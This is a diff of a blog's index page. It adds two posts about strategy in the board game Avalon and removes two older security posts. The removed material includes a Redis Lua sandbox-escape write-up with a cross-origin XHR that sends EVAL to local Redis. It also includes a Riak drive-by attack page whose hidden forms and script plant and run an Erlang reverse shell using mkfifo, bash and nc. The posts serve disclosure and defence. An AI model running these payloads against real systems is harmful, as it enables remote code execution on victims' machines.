@@ -9,7 +9,7 @@
   <meta name="author" content="Ben Murphy">
 
   
-  <meta name="description" content="For some background check John Regehr&rsquo;s excellent post on the history of problems caused by dividing INT_MIN by -1. DTrace is an interpreter &hellip;">
+  <meta name="description" content="I&rsquo;ve been thinking for a while if it is possible for the &lsquo;good&rsquo; team in Avalon to follow some optimal strategy that would always &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -76,6 +76,116 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/08/08/mechanically-solving-avalon/">Mechanically Solving Avalon</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-08-08T21:48:48+01:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I&rsquo;ve been thinking for a while if it is possible for the &lsquo;good&rsquo; team in Avalon to follow some optimal strategy that would always achieve victory. To simplify things this post will focus on finding an optimal strategy for 5 person Avalon when the Merlin(Commander) and the Assassin are both in play. It is important to note in this variant the &lsquo;good&rsquo; team at best can only win on average 2/3 of games because the &lsquo;evil&rsquo; team can always randomly pick the Merlin at the end of the game and will guess correctly 1 in 3 times. This question has also been answered before on <a href="https://boardgames.stackexchange.com/questions/20476/solution-to-avalon-board-game">stackexchange</a> but we will try and answer it without crypto. But we will use something very similar to crypto and similar strategies so I&rsquo;m not sure if we are adding anything useful.</p>
+
+<p>The 5 person Avalon game is interesting because there are only 2 &lsquo;evil&rsquo; and 3 &lsquo;good&rsquo; people. This creates an easy mechanism to solve the game.</p>
+
+<ol>
+<li><p>After the game has been setup everyone secretly writes down a list of people they know are good. Merlin writes down the people who knows are good. Other good people pretend to write down a list of people but instead write gibberish.</p></li>
+<li><p>The lists are shuffled.</p></li>
+<li><p>There will be either 1, 2 or 3 non-gibberish lists depending on what the &lsquo;evil&rsquo; people do.</p></li>
+<li><p>If there is 1 non-gibberish list the &lsquo;good&rsquo; teams wins by just following the list because this is Merlin&rsquo;s list.</p></li>
+<li><p>If there is 2 or 3 non-gibberish lists then follow one list until it fails then switch to the other list. It is only possible for at most 2 missions to fail because after a list fails it is no longer used to pick teams. If only 2 missions fail then 3 missions succeed and the good team wins.</p></li>
+</ol>
+
+
+<p>The strategy also shows why the Assassin is so important in the 5 player variant. Because without the Assassin the Commander could just announce themselves and even if the evil team optimally bluffed and impersonated the Commander themselves they would still be guaranteed to lose.</p>
+
+<p>This strategy only works when there are 2 &lsquo;evil&rsquo; players so only in the 5 and 6 player variants. Once a third &lsquo;evil&rsquo; player is introduced it is possible to fail 3 missions using 3 evil lists.</p>
+
+<p>Can we solve 7+ player games using this strategy?</p>
+
+<p>If we have 3 evil players then we need to eliminate a list initially or run a mission that will eliminate two lists instead of one.</p>
+
+<p>Unlike the stackexchange solution we don&rsquo;t have a way to identify the author of a list so some of the strategies for eliminating lists do not work. However, we can still:</p>
+
+<ol>
+<li><p>If a mission fails then any list that contains all the members of the failing mission is also a bad list.</p></li>
+<li><p>If a mission fails and none of the members of the failing mission is in the compliment of a list then this list is a bad list.</p></li>
+<li><p>Any members common to all lists are good.</p></li>
+</ol>
+
+
+<p>To test whether evil players have a winning strategy it should be possible to brute force all the combinations of evil lists: 7C4<sup>3</sup> + 7C4<sup>2</sup> + 7C4 => 44135 and see if any of them can&rsquo;t be solved by an optimal good team.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/08/08/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-08-08T21:41:33+01:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>For those that don&rsquo;t know <a href="https://boardgamegeek.com/boardgame/128882/resistance-avalon">Avalon</a> (or <a href="https://boardgamegeek.com/boardgame/41114/resistance">The Resistance</a>) is a board game where a &lsquo;good&rsquo; team which consist of the majority of players attempt to pass 3 missions while an &lsquo;evil&rsquo; team which consist of a minority of the players try to sabotage them. The &lsquo;evil&rsquo; team achieves this objective by convincing the other players to put them on missions and then failing the missions. The &lsquo;evil&rsquo; team is in a better position to do this because they know who all the other &lsquo;evil&rsquo; players are and can coordinate their voting or influence discussions to achieve their objective. On the other hand the &lsquo;good&rsquo; team is generally in the dark about the identity of the other players except for a few important exceptions.</p>
+
+<p>We generally play 10 players with the Commander (Merlin), Bodyguard (Percival), Deep Cover (Mordred) and False Commander (Morgana) characters. The Commander knows who all the evil characters are except for Deep Cover. The Bodyguard knows who the Commander and False Commander is but doesn&rsquo;t know which is which. We also use the Lady of the Lake which allows its holder after the second round to find out which team another play is on privately. The person being interrogtated cannot lie but the person receiving the information can lie or tell the truth to the rest of the table. The Lady of the Lake token then passes to the player that was interrogated and they get an opportuntity to use it on the next round and so forth. We also sometimes play only vanilla resistance without characters but with plot cards.</p>
+
+<p>Because we play a lot with each other some interesting behaviour has emerged. Firstly, we have a house technique which allows multiple evil players to coordinate failing a mission. For example in a 3 player mission with two evil players it would be a disaster if both evil players put in a fail card. So it has evolved that the person who proposed the mission or the first evil player clockwise (the first evil player to pick the next mission) from the person who proposed the mission is responsible for failing the mission. This removes a lot of deductive ability from the good team because it is difficult to assume that there is only 1 evil player in a mission if it fails.</p>
+
+<p>We have also noticed that a lot of missions in the first round will be forced to the last pick because in the ten player games it is very difficult to get 6 good people (all the good people) to coordinate on picking a team. So generally the only way a mission passes before the last pick in the first round is because of evil shenanigans so good people are wary of voting for a team they are not on. This often means the position of the players has a large effect on the outcome of the game.</p>
+
+<p>A lot of the games lately are being won by the good team but then the win is being overturned by the assassin. In the latest game the Assassin was not picked because they provided the most useful information to the table, they actually did very little, but rather because they made no incorrect statements. The evil team is often very focused on finding the Commander even to the detriment of getting a clean win.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -4272,333 +4382,6 @@ summary:     7036559: ConcurrentHashMap footprint and contention improvements
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/04/redis-eval-lua-sandbox-escape/">Redis EVAL Lua Sandbox Escape</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2015-06-04T09:52:00+01:00" pubdate data-updated="true"></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>It is possible to break out of the Lua sandbox in Redis and execute arbitrary
-code. This vulnerability is not new and is heavily based on
-<a href="https://www.youtube.com/watch?v=OSMOTDLrBCQ">Peter Cawley&rsquo;s work</a> with Lua bytecode
-<a href="https://gist.github.com/corsix/6575486">type confusion</a>.</p>
-
-<p>This shouldn&rsquo;t pose a threat to users under the trusted Redis security model
-where only trusted users can connect to the database. However, in real
-deployments there could be databases that can be accessed by untrusted users.
-The main deployments that are vulnerable are developers machines, places where
-redis servers can be reached via SSRF attacks and cloud hosting.</p>
-
-<p><a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a> have been released to fix this issue.</p>
-
-<h1>Vulnerable Deployments</h1>
-
-<h2>Developers Machines</h2>
-
-<p>Developers machines may be vulnerable because they bind Redis to all interfaces
-which used to be the default listen directive in the Redis configuration.</p>
-
-<p>Developers may also be vulnerable even if they bind to 127.0.0.1 because Redis
-is effectively a HTTP server. The first mention of attacking Redis via HTTP I
-could find is by <a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Nicolas Grégoire</a>
-where he documents attacking a Redis server on a Facebook property using a SSRF
-vulnerability.</p>
-
-<p>Because Redis is a HTTP server the same origin policies of browsers will allow
-any website on the internet to send a POST request to it. When using XHR the
-body is completely controllable. For example if you run the following in the
-console of your webbrowser while running wireshark:</p>
-
-<pre><code>var x = new XMLHttpRequest();
-x.open("POST", "http://127.0.0.1:6379");
-x.send('eval "print(\\"hello\\")" 0\r\n');
-</code></pre>
-
-<p>In wireshark you will see:</p>
-
-<pre><code>POST / HTTP/1.1
-Host: 127.0.0.1:6379
-Connection: keep-alive
-Content-Length: 27
-Pragma: no-cache
-Cache-Control: no-cache
-Origin: http://www.agarri.fr
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
-Content-Type: text/plain;charset=UTF-8
-Accept: */*
-Referer: http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.8
-
-eval "print(\"hello\")" 0
--ERR unknown command 'POST'
--ERR unknown command 'Host:'
--ERR unknown command 'Connection:'
--ERR unknown command 'Content-Length:'
--ERR unknown command 'Pragma:'
--ERR unknown command 'Cache-Control:'
--ERR unknown command 'Origin:'
--ERR unknown command 'User-Agent:'
--ERR unknown command 'Content-Type:'
--ERR unknown command 'Accept:'
--ERR unknown command 'Referer:'
--ERR unknown command 'Accept-Encoding:'
--ERR unknown command 'Accept-Language:'
-$-1
-</code></pre>
-
-<p>And in the stdout for Redis you will see:</p>
-
-<pre><code>hello
-</code></pre>
-
-<p>The attacker is not able to read the response from the server because of the
-same origin policy. However, this might be worked around by using a <a href="https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/">DNS rebinding attack</a>.
-Even with DNS rebinding it might not be possible to read the response because
-the response is not valid HTTP.</p>
-
-<p>However, reading the response is not necessary because you can package a super generic
-exploit that checks the result of the redis.call(&ldquo;INFO&rdquo;) command and then
-launches a OS/architecture specific payload.</p>
-
-<h2>SSRF attacks</h2>
-
-<p>This is similar to attacking developers except a trusted server is tricked into
-making a request to the Redis server However, you need a lot of control over
-the body which might not often be possible depending on how the body is encoded.</p>
-
-<h2>Redis Cloud Hosting</h2>
-
-<p>This will only effect providers where people running arbitrary code from the
-Redis process is not part of their threat model. The major players in this area
-look like they are using sandboxing. For example the pids returned by &lsquo;INFO&rsquo; on
-heroku are very low &lt;10 which indicates they are running the Redis servers in
-containers. You can already run arbitrary code in containers via dynos on Heroku
-so running arbitrary code in a Redis container is probably not useful for an
-attacker. Amazon Elasticcache also looks like it uses linux containers.</p>
-
-<p>Similarily, it looks like Microsoft&rsquo;s hosted Redis solution runs in an
-isolated VM. Redis &lsquo;INFO&rsquo; returns a virtual os string and it takes ~15
-minutes to launch an instance. If MS aren&rsquo;t running in an isolated VM then the
-15 minute startup time is very weird.</p>
-
-<p>This will be a problem if a hosting provider runs a whole bunch of redis
-processes on the same machine/same VM from different customers without any
-kind of isolation.</p>
-
-<h1>Exploit</h1>
-
-<p><a href="https://gist.github.com/corsix/6575486">Peter Cawley</a> has found that the
-loadstring function can be used to load bytecode that is unsafe. He has
-created three very useful lua exploit primitives that make exploitation easy.</p>
-
-<p>First is a way of reading the Value contained in a TValue struct. This allows
-reading the pointer value from a lua tagged value. Some pointer values are
-already public (using tostring) but there doesn&rsquo;t seem to be a way to get the
-pointer value for a lua string so this is useful.</p>
-
-<p>Second is a way of reading 8 bytes from an arbitrary memory address.</p>
-
-<p>Third is a way of writing 8 bytes to an arbitrary memory address.</p>
-
-<p>Using the arbitrary memory read it is possible to leak the address of a known
-C function. From the address of this c-function it is possible to find the base
-address of the redis-server binary. From this base address it is possible to
-find pointers to libc/libsystem_c functions and to find the base address of the
-libc/libsystem_c libraries. From these libraries it is possible to find the
-addresses of useful exported functions (longjump/system) and ROP gadgets. This
-technique is similar to pwntools <a href="http://pwntools.readthedocs.org/en/latest/dynelf.html">dynelf</a></p>
-
-<p>The arbitrary memory read is also used to leak an address inside the stack. The
-lua_State object holds a long_jump variable that references a long_jump buffer
-that is allocated on the stack. This leaks the stack address which can be useful
-if you just want to corrupt the stack or the rsp and rip can be overwritten in
-the longjump buf to directly take control when longjump is called. OSX has no
-pointer mangling protections so this is quite easy to corrupt.</p>
-
-<p>On linux the rip and rsp (and rbp) values are mangled. However, if you have full
-read access to the memory you can reverse the secret cookie value to corrupt
-the values. Also, linux prevents you from longjmp'ing to an invalid stack frame
-(ie: the heap) but you can longjump to point the stack inside the longjump
-buffer then pivot the stack into the heap. This is not really necessary if you
-don&rsquo;t care about corrupting the stack and crashing the redis process but if you
-longjump and don&rsquo;t corrupt the stack then you can resume normal execution of
-redis after the exploit has finished running.</p>
-
-<h1>Exploitability</h1>
-
-<p>I have exploits for Linux 64 bit and OSX 64 bit. Both exploits take care to not
-crash the redis server during successful execution. They will make a call to
-system() then go back to normal redis execution.</p>
-
-<p>I have run the Linux exploit on the Amazon RHEL Image (PIE enabled) and the
-Amazon 14.04 Ubuntu Image (no PIE). I believe the exploit will work on most
-modern Linux 64 bit systems (I suspect it will not work if you compile libc with
- fomit-frame-pointer but this can be worked around). It does not use any
-hardcoded addresses from libc or the Redis binary.</p>
-
-<p>The OSX version I have only tested on Yosemite but an earlier version was
-working on Mavericks and I believe the Yosemite version works on both. This has
-been tested with two different Redis versions and similarily does not depend on
-hardcoded address from libsystem_c or the Redis binary. However, it uses
-addresses from libsystem_c to speed up the exploit.</p>
-
-<h1>Workarounds</h1>
-
-<p>The best option is to set a strong password on Redis. Systems that are reachable
-via HTTP without a password are a problem waiting to happen.</p>
-
-<p>It is also possible to rename the EVAL command. If you are not using EVAL this
-is a good option but you still might be at risk of someone modifying your Redis
-data via HTTP SSRF attacks.</p>
-
-<p>Upgrading to <a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a>
-will also fix this issue but I still strongly recommend using password
-authentication on Redis systems.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/09/01/riak-drive-by-attack/">Riak Drive by Attack</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true"></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>
-
-<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>
-
-<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>
-
-<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>
-
-<p>The attack will perform the following actions</p>
-
-<ol>
-<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
-<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
-<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
-</ol>
-
-
-<p>By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause.</p>
-
-<p>Click ‘Hack Me’ below to start the attack.</p>
-
-<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
-  <input name='lols' type='hidden' value='lols' />
-</form></p>
-
-
-
-
-<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
-</form></p>
-
-
-
-
-<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
-</form>
-<input id='hack_me' type='button' value='Hack Me' /></p>
-
-
-
-
-<script type='text/javascript'>
-  //<![CDATA[
-    $("#hack_me").click(function() {
-        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
-            $("#insert_record_form")[0].submit();
-            setTimeout(write_file, 1000);
-        }
-    });
-    
-    function write_file() {
-        $("#write_file_form")[0].submit();
-        setTimeout(evaluate_file, 1000);           
-    }
-    
-    function evaluate_file() {
-        $("#evaluate_file_form")[0].submit();          
-    }
-  //]]>
-</script>
-
-
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="2">&larr; Older</a>
@@ -4614,6 +4397,14 @@ authentication on Redis systems.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2017/08/08/mechanically-solving-avalon/">Mechanically Solving Avalon</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/08/08/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2017/03/07/dtrace-division-by-zero/">DTrace Division by Zero</a>
       </li>
     
@@ -4623,14 +4414,6 @@ authentication on Redis systems.</p>
     
       <li class="post">
         <a href="/blog/2017/01/06/arbitrary-kernel-memory-reads-on-illumos/">Arbitrary Kernel Memory Reads on Illumos</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/07/11/rails-webconsole-dns-rebinding/">Rails Webconsole DNS Rebinding</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/11/09/zdi-13-XXX-java-sandbox-bypass-1-dot-7-0-10-slash-1-dot-6-0-38-via-proxy-and-jmx/">ZDI-13-XXX (2013) Java Sandbox Bypass (1.7.0_10) / (1.6.0_38) via Proxy and JMX</a>
       </li>
     
   </ul>
